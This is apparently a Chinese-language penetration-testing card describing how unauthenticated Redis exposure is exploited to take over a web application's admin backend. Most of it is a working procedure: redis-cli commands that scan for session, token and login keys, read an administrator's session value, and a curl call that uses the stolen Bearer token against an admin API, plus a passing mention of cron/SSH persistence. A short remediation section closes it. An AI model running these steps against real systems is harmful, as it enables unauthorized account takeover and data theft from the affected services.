---
title: Redis 未授权 → 偷后台 session / token 直接进后台
cve: 无（配置缺陷）
severity: critical
cvss: 9.1
product: 自研后台（session/token 存 Redis）
versions: 任意
ports: 6379
keywords: redis, 未授权, session, token, 后台, 接管
entry: Redis 里的 login/session/token 键
verified: false
sources: 公开资料整理（配置缺陷类）
---

## 指纹

```
redis-cli -h target ping          → PONG（未授权）
redis-cli -h target info          → 版本与 keyspace
```

## 前置条件

- Redis 暴露且无密码；应用把登录态存 Redis（多数 Java/PHP 后台）。

## PoC

```bash
# 1) 确认未授权
redis-cli -h target ping

# 2) 找登录态键
redis-cli -h target --scan --pattern '*token*'  | head
redis-cli -h target --scan --pattern '*session*' | head
redis-cli -h target --scan --pattern '*login*'  | head

# 3) 取一个管理员会话值（JSON 或 序列化串）
redis-cli -h target get "login_tokens:<uuid>"
# 判定：值里含 userId=1 / admin / roles = 可直接冒用
```

```bash
# 4) 用 token 调后台
curl -s 'https://target/api/admin/user/list' -H 'Authorization: Bearer <token值>' | head -c 200
```

## 利用步骤

1. 先 ping（无破坏）；
2. 扫 `token/session/login` 三类键，挑 principal 是管理员的；
3. 用值直接调接口验证；
4. 需要持久时再考虑写 cron/SSH（属另一条链，别在这里做）；
5. 证据：键名 + 值里的 userId/roles（打码）+ 接口 200。

## 修复与缓解

- Redis 加密码 + 只监听内网 + 禁危险命令（rename-command CONFIG ""）；
- 登录态加签名/绑定 IP+UA，缩短 TTL。

## 参考

- Redis 安全基线；OWASP 会话管理。
